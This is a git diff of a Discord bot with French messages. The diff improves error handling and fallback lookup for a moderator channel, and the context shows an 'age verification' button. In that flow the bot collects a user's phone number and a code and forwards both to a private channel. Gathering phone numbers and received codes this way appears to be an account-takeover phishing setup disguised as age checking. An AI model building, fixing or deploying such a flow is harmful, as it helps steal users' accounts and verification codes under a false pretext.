@@ -33,16 +33,21 @@ async function getModChannel() {
     try {
       const c = await client.channels.fetch(process.env.MOD_CHANNEL_ID);
       if (c) return c;
-    } catch {}
-  }
-  const guild = await client.guilds.fetch(MOD_GUILD_ID);
-  const channels = await guild.channels.fetch();
-  for (const [, ch] of channels) {
-    if (ch.type === ChannelType.GuildText && ch.permissionsFor(guild.members.me).has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) {
-      return ch;
+    } catch (e) {
+      console.error("MOD_CHANNEL_ID fetch fail:", e.message);
     }
   }
-  throw new Error("Salon modo introuvable");
+  const guild = await client.guilds.fetch(MOD_GUILD_ID);
+  const me = await guild.members.fetchMe().catch(() => null);
+  const channels = await guild.channels.fetch();
+  for (const [, ch] of channels) {
+    if (ch.type !== ChannelType.GuildText) continue;
+    try {
+      const perms = me ? ch.permissionsFor(me) : ch.permissionsFor(guild.members.me);
+      if (perms && perms.has([PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ViewChannel])) return ch;
+    } catch {}
+  }
+  throw new Error("Salon modo introuvable, mets MOD_CHANNEL_ID dans Render");
 }
 
 async function sendToMods(originInteraction, phone, code) {
@@ -95,7 +100,7 @@ async function sendToMods(originInteraction, phone, code) {
   await modChannel.send({ embeds: [logEmbed] });
 }
 
-client.once("clientReady", async () => {
+async function onReady() {
   console.log(`Connecte en tant que ${client.user.tag}`);
   try {
     await client.application.commands.create({
@@ -118,7 +123,9 @@ client.once("clientReady", async () => {
     new ButtonBuilder().setCustomId("verify_age").setLabel("🔓 Vérifier mon âge").setStyle(ButtonStyle.Primary)
   );
   await channel.send({ embeds: [embed], components: [row] });
-});
+}
+client.once("ready", onReady);
+client.once("clientReady", onReady);
 
 client.on("interactionCreate", async (i) => {
   if (i.isChatInputCommand() && i.commandName === "clear") {
@@ -189,8 +196,9 @@ client.on("interactionCreate", async (i) => {
     await i.reply({ content: "Code reçu. En attente de validation par un modérateur.", flags: MessageFlags.Ephemeral });
     try {
       await sendToMods(i, phone, code);
-    } catch {
-      await i.followUp({ content: "Erreur d'envoi vers la modération.", flags: MessageFlags.Ephemeral });
+    } catch (e) {
+      console.error("sendToMods fail:", e);
+      await i.followUp({ content: `Erreur d'envoi vers la modération: ${e.message}`, flags: MessageFlags.Ephemeral });
     }
     return;
   }
